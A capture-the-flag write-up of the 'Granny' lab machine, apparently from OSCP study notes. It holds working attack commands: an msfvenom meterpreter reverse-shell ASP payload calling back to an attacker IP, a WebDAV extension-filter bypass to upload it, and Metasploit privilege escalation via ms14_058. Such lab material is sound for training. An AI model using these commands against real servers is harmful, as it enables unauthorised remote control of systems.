## Granny

Difficulty: Easy

### User Flag

Rustscan points to us that port 80 uses Microsoft IIS as webserver and webdav as well.

```
rustscan -a 10.10.10.15 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/7178f72f-a39c-462e-bad3-9cec2d69dfd6)

<br>

We can use davtest to validate what extensions we can upload to the website and discover that only txt and html are allowed.

```
davtest -url http://10.10.10.15
```

![davtest](https://github.com/b1d0ws/OSCP/assets/58514930/b2a291d1-0a17-4d5e-8b70-5740d40a576e)

<br>

To upload asp file, we can use cadaver and bypass the extension using ;  

Since privilege escalation requires metasploit, we're goind to use meterpreter payload, but a normal shell can also be obtained.

```
# Meterpreter Exploit
msfvenom -p windows/meterpreter/reverse_tcp -f asp lhost=10.10.14.21 lport=1337 > shell.asp

put meterpreter.txt
copy meterpreter.txt meterpreter.asp;.txt

use multi/handler with payload windows/meterpreter/reverse_tcp
```

![uploadASP](https://github.com/b1d0ws/OSCP/assets/58514930/4c145110-6740-4f1f-b925-3cf34bd5c873)

![gettingHandler](https://github.com/b1d0ws/OSCP/assets/58514930/94347ea7-832e-4332-a1c4-43510ca6ab2e)

<br>

### Root Flag

Local Exploit suggester points some vulnerabilities.

```
use post/multi/recon/local_exploit_suggester
```

![localExploitSuggester](https://github.com/b1d0ws/OSCP/assets/58514930/7e93c760-71a7-4d05-9991-2d61e2c2383b)

<br>

We have to migrate process for the exploit to work.

```
migrate 1956 (wmiprvse.ex)
msf6 exploit(windows/local/ms14_058_track_popup_menu) > run
```

![privilegeEscalation](https://github.com/b1d0ws/OSCP/assets/58514930/7d07e57d-f435-4a4f-ae0d-344f150054b3)
